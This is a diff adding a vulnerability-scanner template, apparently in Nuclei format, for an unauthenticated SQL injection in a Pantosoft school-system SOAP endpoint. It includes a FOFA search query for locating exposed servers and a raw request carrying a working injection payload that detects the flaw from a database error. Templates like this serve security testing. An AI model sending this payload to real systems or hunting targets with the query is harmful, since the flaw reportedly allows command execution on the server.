@@ -1,0 +1,44 @@
+id: xuefenzhi-GetCalendarContentById-sql-injection
+
+info:
+  name: "Pantosoft GetCalendarContentById接口SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="www.pantosoft.com" && body="Pantosoft Corporation" || icon_hash="-1632820573"
+      该接口存在SQL注入漏洞，攻击者无需身份验证即可通过构造恶意SQL语句利用数据库扩展存储过程xp_cmdshell执行系统命令，实现对目标服务器的控制。经评估，该漏洞利用复杂度较低，建议相关系统管理员立即采取修复措施。
+  reference:
+  - https://Unknown.blog.csdn.net/article/details/139843702
+  tags: Pantosoft
+
+http:
+- raw:
+  - |
+    POST /WebService_PantoSchool.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+      <soapenv:Header/>
+        <soapenv:Body>
+          <tem:GetCalendarContentById>
+            <!--type: string-->
+            <tem:ID>1' OR 1 IN (SELECT @@version) AND '1'='1</tem:ID>
+          </tem:GetCalendarContentById>
+        </soapenv:Body>
+    </soapenv:Envelope>
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '转换成数据类型 int 时失败'
+  - type: status
+    status:
+    - 500
+
+
+
+
+
